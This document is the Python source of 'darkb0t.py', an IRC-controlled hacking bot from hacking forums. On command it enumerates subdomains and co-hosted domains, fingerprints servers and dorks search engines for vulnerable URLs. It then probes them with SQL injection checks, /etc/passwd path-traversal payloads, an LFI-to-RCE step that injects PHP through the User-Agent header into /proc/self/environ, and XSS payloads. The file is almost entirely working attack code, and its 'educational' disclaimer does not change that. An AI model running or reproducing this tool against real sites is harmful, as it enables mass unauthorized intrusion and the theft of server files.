#!/usr/bin/python
# This was written for educational purpose and pentest only. Use it at your own risk.
# Author will be not responsible for any damage!
# !!! Special greetz for my friend sinner_01 !!!
# Toolname        : darkb0t.py
# Coder           : baltazar a.k.a b4ltazar < b4ltazar@gmail.com>
# Version         : 0.4
# Greetz for rsauron and low1z, great python coders
# greetz for d3hydr8, r45c4l, qk, fx0, Soul, MikiSoft, c0ax, b0ne and all members of ex darkc0de.com, ljuska.org & darkartists.info 

import sys, subprocess, socket, string, httplib, urlparse, urllib, re, urllib2, random, threading, cookielib
from sgmllib import SGMLParser
from xml.dom.minidom import parse, parseString
from time import sleep

try:
  set
except NameError:
  from sets import Set as set


def logo():
	print "\n|---------------------------------------------------------------|"
        print "| b4ltazar[@]gmail[dot]com                                      |"
        print "|   02/2012     darkb0t.py  v.0.4                               |"
        print "|    darkartists.info     &      ljuska.org                     |"
        print "|                                                               |"
        print "|---------------------------------------------------------------|\n"

def cmd():
  print "[!] Commands the bot understands: "
  print "\n[+] !help    : Help"
  print "[+] !usage   : Examples of usage"
  print "[+] !over    : Bot quits"
  print "[+] !clear   : Clearing the urls in array!"
  print "[+] !status  : Show status of finished threads"
  print "[+] !reverse : List domains hosted on the same IP"
  print "[+] !srvinfo : Some info about target server"
  print "[+] !sub     : Checking for subdomains"
  print "[+] !check   : Crawl links from target and check for SQLi, LFI, LFI to RCE, XSS"
  print "[+] !dork    : Using dork for collecting links and then check for SQLi"

if sys.platform == 'linux' or sys.platform == 'linux2':
  subprocess.call('clear', shell=True)
  logo()
  cmd()
else:
  subprocess.call('cls', shell=True)
  logo()
  cmd()
if len(sys.argv) != 5:
  print "[!] Usage: python darkb0t.py <host> <port> <nick> <channel>"
  print "[!] Exiting, thx for using script"
  sys.exit(1)
  
subdomains = ['adm','admin','admins','agent','aix','alerts','av','antivirus','app','apps','appserver','archive','as400','auto','backup','banking','bbdd','bbs','bea','beta','blog','catalog','cgi','channel','channels','chat','cisco','client','clients','club','cluster','clusters','code','commerce','community','compaq','conole','consumer','contact','contracts','corporate','ceo','cso','cust','customer','cpanel','data','bd','db2','default','demo','design','desktop','dev','develop','developer','device','dial','digital','dir','directory','disc','discovery','disk','dns','dns1','dns2','dns3','docs','documents','domain','domains','dominoweb','download','downloads','ecommerce','e-commerce','edi','edu','education','email','enable','engine','engineer','enterprise','error','event','events','example','exchange','extern','external','extranet','fax','field','finance','firewall','forum','forums','fsp','ftp','ftp2','fw','fw1','gallery','galleries','games','gateway','gopher','guest','gw','hello','helloworld','help','helpdesk','helponline','hp','ibm','ibmdb','ids','ILMI','images','imap','imap4','img','imgs','info','intern','internal','intranet','invalid','iphone','ipsec','irc','ircserver','jobs','ldap','link','linux','lists','listserver','local','localhost','log','logs','login','lotus','mail','mailboxes','mailhost','management','manage','manager','map','maps','marketing','device','media','member','members','messenger','mngt','mobile','monitor','multimedia','music','my','names','net','netdata','netstats','network','news','nms','nntp','ns','ns1','ns2','ns3','ntp','online','openview','oracle','outlook','page','pages','partner','partners','pda','personal','ph','pictures','pix','pop','pop3','portal','press','print','printer','private','project','projects','proxy','public','ra','radio','raptor','ras','read','register','remote','report','reports','root','router','rwhois','sac','schedules','scotty','search','secret','secure','security','seri','serv','serv2','server','service','services','shop','shopping','site','sms','smtp','smtphost','snmp','snmpd','snort','solaris','solutions','support','source','sql','ssl','stats','store','stream','streaming','sun','support','switch','sysback','system','tech','terminal','test','testing','testing123','time','tivoli','training','transfers','uddi','update','upload','uploads','video','vpn','w1','w2','w3','wais','wap','web','webdocs','weblib','weblogic','webmail','webserver','webservices','websphere','whois','wireless','work','world','write','ws','ws1','ws2','ws3','www1','www2','www3']

header = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
          'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
          'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
	  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
	  'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
	  'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
	  'Microsoft Internet Explorer/4.0b1 (Windows 95)',
	  'Opera/8.00 (Windows NT 5.1; U; en)',
	  'amaya/9.51 libwww/5.4.0',
	  'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
	  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
	  'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
	  'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]']

sqlerrors = {'MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
             'Server Error' : 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring' : 'Invalid Querystring',
             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
             'VBScript Runtime' : 'VBScript Runtime',
             'ADODB.Field' : 'ADODB.Field',
             'BOF or EOF' : 'BOF or EOF',
             'ADODB.Command' : 'ADODB.Command',
             'JET Database' : 'JET Database',
             'mysql_fetch_array()' : 'mysql_fetch_array()',
             'Syntax error' : 'Syntax error',
             'mysql_numrows()' : 'mysql_numrows()',
             'GetArray()' : 'GetArray()',
             'FetchRow()' : 'FetchRow()',
             'Input string was not in a correct format' : 'Input string was not in a correct format',
             'Not found' : 'Not found'}

lfis = ["/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../../etc/passwd%00","/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../../etc/passwd"]

xsses = ["<h1>XSS by baltazar</h1>","%3Ch1%3EXSS%20by%20baltazar%3C/h1%3E"]

timeout = 300
socket.setdefaulttimeout(timeout)
threads = []
urls = []

host = sys.argv[1]
port = int(sys.argv[2])
nick = sys.argv[3]
chan = sys.argv[4]

def revip():
  sites = [target]
  appid = '01CDBCA91C590493EE4E91FAF83E5239FEF6ADFD'
  ip = socket.gethostbyname(target)
  offset = 50
  num = 1
  while offset < 300:
    url ="/xml.aspx?AppId=%s&Query=ip:%s&Sources=Web&Version=2.0&Market=en-us&Adult=Moderate&Options=EnableHighlighting&Web.Count=50&Web.Offset=%s&Web.Options=DisableQueryAlterations" % (appid,  ip,  offset)
    conn = httplib.HTTPConnection("api.bing.net")
    conn.request("GET", url)
    res = conn.getresponse()
    data = res.read()
    conn.close()
    xmldoc = parseString(data)
    name = xmldoc.getElementsByTagName('web:DisplayUrl')
    for n in name:
      temp = n.childNodes[0].nodeValue
      temp = temp.split("/")[0]
      if temp.find('www.') == -1:
	sites.append(temp)
    offset += 50
  print "\n[+] Target: ",target
  print "[+] IP: ",ip
  print "[+] Reverse IP LookUP ..."
  print "[+] Please wait!"
  print "[!] Total: ", len(sites), " domain(s)\n"
  s.send("PRIVMSG %s :%s%s\r\n" % (chan, "[+] Target: ", target))
  s.send("PRIVMSG %s :%s%s\r\n" % (chan, "[+] IP: ", ip))
  s.send("PRIVMSG %s :%s\r\n" % (chan, "[+] Reverse IP LookUp ..."))
  s.send("PRIVMSG %s :%s\r\n" % (chan, "[+] Please wait!"))
  s.send("PRIVMSG %s :%s%s%s\r\n" % (chan, "[!] Total: ",len(sites), " domain(s)"))
  for si in sites:
    print "[",num,"/",len(sites),"] http://"+si
    s.send("PRIVMSG %s :%s%s%s%s%s%s\r\n" % (chan,"[",num,"/",len(sites),"] http://", si))
    sleep(2)
    num += 1
  
def srvinfo():
  conn = httplib.HTTPConnection(target, 80)
  try:
    conn.request("HEAD", "/")
  except socket.timeout:
    print "[-] Server Timeout"
    s.send("PRIVMSG %s :%s\r\n" % (chan, "[-] Server Timeout"))
  except(KeyboardInterrupt, SystemExit):
    pass
  r1 = conn.getresponse()
  conn.close()
  ip = socket.gethostbyname(target)
  server = r1.getheader('Server')
  xpoweredby = r1.getheader('x-powered-by')
  date = r1.getheader('date')
  if xpoweredby == None:
    print "\n[+] Ip of server: ", ip
    print "[+] Server info: ", server
    print "[+] Server date: ", date
    s.send("PRIVMSG %s :%s%s\r\n" % (chan, "[+] Ip of server: ", ip))
    s.send("PRIVMSG %s :%s%s\r\n" % (chan, "[+] Server info: ", server))
    s.send("PRIVMSG %s :%s%s\r\n" % (chan, "[+] Server date: ", date))
  else:
    print "\n[+] Ip of server: ", ip
    print "[+] Server info: ", server
    print "[+] Xpoweredby: ", xpoweredby
    print "[+] Server date: ", date
    s.send("PRIVMSG %s :%s%s\r\n" % (chan, "[+] Ip of server: ", ip))
    s.send("PRIVMSG %s :%s%s\r\n" % (chan, "[+] Server info: ", server))
    s.send("PRIVMSG %s :%s%s\r\n" % (chan, "[+] Xpoweredby: ", xpoweredby))
    s.send("PRIVMSG %s :%s%s\r\n" % (chan, "[+] Server date: ", date))
    
def sub():
  w00t = 0
  print "\n[+] Target: ", domain
  s.send("PRIVMSG %s :%s%s\r\n" % (chan, "[+] Target: ", domain))
  print "[+] Checking for subdomains\n"
  s.send("PRIVMSG %s :%s\r\n" % (chan, "[+] Checking for subdomains"))
  for sub in subdomains:
    subdomain = sub+'.'+domain
    try:
      target = socket.gethostbyname(subdomain)
      w00t = w00t+1
      print subdomain
      s.send("PRIVMSG %s :%s\r\n" % (chan, subdomain))
    except:
      pass
  print "[!] Found ",w00t," subdomain(s)\n"
  s.send("PRIVMSG %s :%s%s%s\r\n" % (chan, "\n[!] Found ",w00t, " subdomain(s)!"))
  
def SQLi(u):
  host = u + "'"
  try:
    source = urllib2.urlopen(host).read()
    for type, eMSG in sqlerrors.items():
      if re.search(eMSG, source):
	print "[!] w00t,w00t!: ",host," Error: ", type, " ---> SQL Injection"
	s.send("PRIVMSG %s :%s%s%s%s%s\r\n" % (chan, "[!] w00t,w00t!: ", host, " Error: ", type, " ---> SQL Injection"))
	sleep(2)
      else:
	pass
  except:
    pass
  
def lfi_rce(u):
  for lfi in lfis:
    try:
      check = urllib2.urlopen(u+lfi.replace("\n", "")).read()
      if re.findall("root:x", check):
	print "[!] w00t,w00t!: ",u+lfi, " ---> LFI Found"
	s.send("PRIVMSG %s :%s%s%s\r\n" % (chan, "[!] w00t,w00t!: ", u+lfi, " ---> LFI Found"))
	sleep(2)
	target = u+lfi
	target = target.replace("/etc/passwd", "/proc/self/environ")
	header = "<? echo md5(baltazar); ?>"
	try:
	  request_web = urllib2.Request(target)
	  request_web.add_header('User-Agent', header)
	  text = urllib2.urlopen(request_web)
	  text = text.read()
	  if re.findall("f17f4b3e8e709cd3c89a6dbd949d7171", text):
	    print "[!] w00t,w00t!: ", target, " ---> LFI to RCE Found"
	    s.send("PRIVMSG %s :%s%s%s\r\n" % (chan, "[!] w00t!,w00t!: ", target, " ---> LFI to RCE Found"))
	    sleep(2)
	except:
	  pass
    except:
      pass

def xss(u):
  for xss in xsses:
    try:
      source = urllib2.urlopen(u+xss.replace("\n", "")).read()
      if re.findall("XSS by baltazar", source):
	print "[!] w00t,w00t!: ", u+xss, " ---> XSS found (might be false)"
	s.send("PRIVMSG %s :%s%s%s\r\n" % (chan, "[!] w00t!,w00t!: ", u+xss, " ---> XSS found (might be false)"))
    except:
      pass

def search(inurl, maxc):
  counter = 0
  while counter < int(maxc):
    jar = cookielib.FileCookieJar("cookies")
    query = inurl+'+site:'+site
    results_web = 'http://www.search-results.com/web?q='+query+'&hl=en&page='+repr(counter)+'&src=hmp'
    request_web = urllib2.Request(results_web)
    agent = random.choice(header)
    request_web.add_header('User-Agent', agent)
    opener_web = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
    text = opener_web.open(request_web).read()
    stringreg = re.compile('(?<=href=")(.*?)(?=")')
    names = stringreg.findall(text)
    counter += 1
    for name in names:
      if name not in urls:
	if re.search(r'\(',name) or re.search("<", name) or re.search("\A/", name) or re.search("\A(http://)\d", name):
	  pass
	elif re.search("google",name) or re.search("youtube", name) or re.search("phpbuddy", name) or re.search("iranhack",name) or re.search("phpbuilder",name) or re.search("codingforums", name) or re.search("phpfreaks", name) or re.search("%", name) or re.search("facebook", name) or re.search("twitter", name):
	  pass
	else:
	  urls.append(name)
    
  tmplist = []
  finallist = []
  print "[+] Urls collected: ", len(urls)
  s.send("PRIVMSG %s :%s%s\r\n" % (chan, "[+] Urls collected: ", len(urls)))
  for u in urls:
    try:
      host = u.split("/", 3)
      domain = host[2]
      if domain not in tmplist and "=" in u:
	finallist.append(u)
	tmplist.append(domain)
    except:
      pass
  print "[+] Urls for checking: ",len(finallist);print ""
  s.send("PRIVMSG %s :%s%s\r\n" % (chan, "[+] Urls for checking: ", len(finallist)))
  return finallist
    
class injThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts;self.fcount = 0
                self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(self.hosts)
                for u in urls:
                        try:
                                if self.check == True:
				        print u
                                        SQLi(u)
                                else:
                                        break
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

        def stop(self):
                self.check = False

class URLLister(SGMLParser):
  def reset(self):
    SGMLParser.reset(self)
    self.urls = []
    
  def start_a(self, attrs):
    href = [v for k, v in attrs if k == 'href']
    if href:
      self.urls.extend(href)
      
def parse_urls(links):
  urls = []
  for link in links:
    num = link.count("=")
    if num > 0:
      for x in range(num):
	x = x + 1
	if link[0] == "/" or link[0] == "?":
	  u = site+link.rsplit("=",x)[0]+"="
	else:
	  u = link.rsplit("=",x)[0]+"="
	if u.find(site.split(".",1)[1]) == -1:
	  u = site+u
	if u.count("//") > 1:
	  u = "http://"+u[7:].replace("//","/",1)
	urls.append(u)
  urls = list(set(urls))
  return urls
  
ircmsg = ""
s = socket.socket( )
s.connect((host, port))
s.send("NICK %s\r\n" % nick)
s.send("USER %s %s baltazar :%s\r\n" % (nick,nick,nick))
s.send("JOIN :%s\r\n" % chan)

while 1:
  ircmsg = ircmsg+s.recv(2048)
  temp = string.split(ircmsg, "\n")
  ircmsg = temp.pop()
  for line in temp:
    line = string.rstrip(line)
    line = string.split(line)
    try:
      if line[1] == "JOIN":
	name = str(line[0].split("!")[0])
	s.send("PRIVMSG %s :%s%s\r\n" % (chan, "Welcome, ", name.replace(":","")))
	s.send("PRIVMSG %s :%s\r\n" % (chan, "b4ltazar@gmail.com"))
	s.send("PRIVMSG %s :%s\r\n" % (chan, "darkb0t.py v.0.4"))
	s.send("PRIVMSG %s :%s\r\n" % (chan, "Visit ljuska.org & darkartists.info"))
	s.send("PRIVMSG %s :%s\r\n" % (chan, "For help type: !help"))
	
      if line[3] == ":!help":
	s.send("PRIVMSG %s :%s\r\n" % (chan, "[+] Commands the b0t understands:"))
	s.send("PRIVMSG %s :%s\r\n" % (chan, "[+] !help     : Help"))
	s.send("PRIVMSG %s :%s\r\n" % (chan, "[+] !usage    : Examples of usage"))
	s.send("PRIVMSG %s :%s\r\n" % (chan, "[+] !over     : Bot quits"))
	s.send("PRIVMSG %s :%s\r\n" % (chan, "[+] !clear    : Clearing the urls in array!"))
	s.send("PRIVMSG %s :%s\r\n" % (chan, "[+] !status   : Show status of finished threads"))
	s.send("PRIVMSG %s :%s\r\n" % (chan, "[+] !reverse  : List domains hosted on the same IP"))
	s.send("PRIVMSG %s :%s\r\n" % (chan, "[+] !srvinfo  : Some info about target server"))
	s.send("PRIVMSG %s :%s\r\n" % (chan, "[+] !sub      : Checking for subdomains"))
	s.send("PRIVMSG %s :%s\r\n" % (chan, "[+] !check    : Crawl links from target and check for SQLi, LFI, LFI to RCE, XSS"))
	s.send("PRIVMSG %s :%s\r\n" % (chan, "[+] !dork     : Using dork for collecting links and then check for SQLi"))
	
      if line[3] == ":!usage":
	s.send("PRIVMSG %s :%s\r\n" % (chan, "[!] !reverse target.com"))
	s.send("PRIVMSG %s :%s\r\n" % (chan, "[!] !srvinfo target.com"))
	s.send("PRIVMSG %s :%s\r\n" % (chan, "[!] !sub target.com"))
	s.send("PRIVMSG %s :%s\r\n" % (chan, "[!] !check http://www.target.com"))
	s.send("PRIVMSG %s :%s\r\n" % (chan, "[!] !dork index.php?id= com 10 10"))
	
      if line[3] == ":!over":
	s.send("PRIVMSG %s :%s\r\n" % (chan, "[!] darkb0t leaves, visit ljuska.org & darkartists.info"))
	print "\n[!] Thx for using darkb0t, visit ljuska.org & darkartists.info"
	sys.exit(1)
	
      if line[3] == ":!clear":
	urls = []
	print "\n[!] Array cleared!"
	s.send("PRIVMSG %s :%s\r\n" % (chan, "[!] Array cleared!"))
	
      if line[3] == ":!status":
	mainthread = 0
	if threads != []:
	  for thread in threads:
	    mainthread += thread.fcount
	  print "\n[+] Number of threads finished scanning: ", mainthread
	  s.send("PRIVMSG %s :%s%s\r\n" % (chan, "[+] Number of threads finished scanning: ", mainthread))
      
      if line[3] == ":!reverse":
	target = line[4]
	revip()
      if line[3] == ":!srvinfo":
	target = line[4]
	srvinfo()
      if line[3] == ":!sub":
	domain = line[4]
	sub()
      if line[3] == ":!check":
	site = line[4]
	site = site.replace("http://","").rsplit("/",1)[0]+"/"
	site = "http://"+site.lower()
	try:
	  usock = urllib.urlopen(site)
	  parser = URLLister()
	  parser.feed(usock.read().lower())
	  parser.close()
	  usock.close()
	except:
	  pass
	urls = parse_urls(parser.urls)
	print "\n[!] Links Found: ", len(urls); print ""
	s.send("PRIVMSG %s :%s%s\r\n" % (chan, "[!] Links Found: ", len(urls)))
	for u in urls:
	  try:
	    print u
	    SQLi(u)
	    lfi_rce(u)
	    xss(u)
	  except(KeyboardInterrupt, SystemExit):
	    print "[!] CTRL+C activated, now exiting! Thx for using darkb0t.py!"
	
      if line[3] == ":!dork":
	inurl = line[4]
	site = line[5]
	maxc = line[6]
	numthreads = line[7]
	print "\n[+] Dork: ", inurl
	print "[+] Domain: ", site
	print "[+] Number of page to search: ", maxc
	print "[+] Number of threads: ", numthreads;print""
	s.send("PRIVMSG %s :%s%s\r\n" % (chan, "[+] Dork: ", inurl))
	s.send("PRIVMSG %s :%s%s\r\n" % (chan, "[+] Domain: ", site))
	s.send("PRIVMSG %s :%s%s\r\n" % (chan, "[+] Number of page to search: ", maxc))
	s.send("PRIVMSG %s :%s%s\r\n" % (chan, "[+] Number of threads: ", numthreads))
	usearch = search(inurl, maxc)
	i = len(usearch) / int(numthreads)
	m = len(usearch) % int(numthreads)
	z = 0
	if len(threads) <= numthreads:
	  for x in range(0, int(numthreads)):
	    sliced = usearch[x*i:(x+1)*i]
	    if (z<m):
	      sliced.append(usearch[int(numthreads)*i+z])
	      z += 1
	    thread = injThread(sliced)
	    thread.start()
	    threads.append(thread)
	for thread in threads:
	  thread.join()
	
	
    except(IndexError):
      pass
    
    if(line[0] == "PING"):
      sleep(1)
      s.send("PONG %s\r\n" % line[1])
